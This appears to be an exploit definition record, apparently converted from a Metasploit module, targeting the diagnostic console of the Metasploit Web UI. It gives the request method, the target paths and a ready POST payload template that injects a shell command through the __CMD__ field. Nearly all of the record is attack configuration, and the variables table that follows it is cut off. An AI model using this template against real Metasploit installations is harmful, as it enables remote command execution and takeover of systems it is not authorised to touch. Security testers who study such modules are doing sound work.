my $EXPLOIT = {
  DESCRIPTION => "\n\n        This module exploits the \"diagnostic console\" feature in the Metasploit\n\n        Web UI to obtain a reverse shell.\n\n\n\n        The diagnostic console is able to be enabled or disabled by an\n\n        administrator on Metasploit Pro and by an authenticated user on\n\n        Metasploit Express and Metasploit Community. When enabled, the\n\n        diagnostic console provides access to msfconsole via the web interface.\n\n        An authenticated user can then use the console to execute shell\n\n        commands.\n\n\n\n        NOTE: Valid credentials are required for this module.\n\n\n\n        Tested against:\n\n\n\n        Metasploit Community 4.1.0,\n\n        Metasploit Community 4.8.2,\n\n        Metasploit Community 4.12.0\n\n      ",
  METHOD      => "POST",
  MSF_MODULE  => "metasploit_webui_console_command_execution",
  PATH        => "settings/update_profile?",
  PATHS       => [
                   "login",
                   "user_sessions",
                   "settings",
                   "settings/update_profile",
                   "",
                 ],
  PAYLOAD     => "utf8=\\xE2\\x9C\\x93&_method=patch&authenticity_token=__AUTHENTICITY_TOKEN__&profile_id=__PROFILE_ID__&allow_console_access=__ALLOW_CONSOLE_ACCESS__&commit=UpdateSettings&read=yes&cmd=__CMD__&authenticity_token=__AUTHENTICITY_TOKEN__&last_event=0&_=&",
  TITLE       => "Metasploit Web UI Diagnostic Console Command Execution",
}
VARIABLES = {
	USER_SESSION[USERNAME] = { DESCRIPTION => "", VALUE => "" },
	PROFILE_ID = { DESCRIPTION => "", VALUE => "" },
	ALLOW_CONSOLE_ACCESS = { DESCRIPTION => "", VALUE => "" },
	CMD = { DESCRIPTION => "", VALUE => "" },
	PASSWORD = { DESCRIPTION => "", VALUE => "" },
	USERNAME = { DESCRIPTION => "", VALUE => "" },
	USER_SESSION[PASSWORD] = { DESCRIPTION => "", VALUE => "" },
	PATH = { DESCRIPTION => "Metasploit Web UI base path", VALUE => "/" },
	AUTHENTICITY_TOKEN = { DESCRIPTION => "", VALUE => "" },
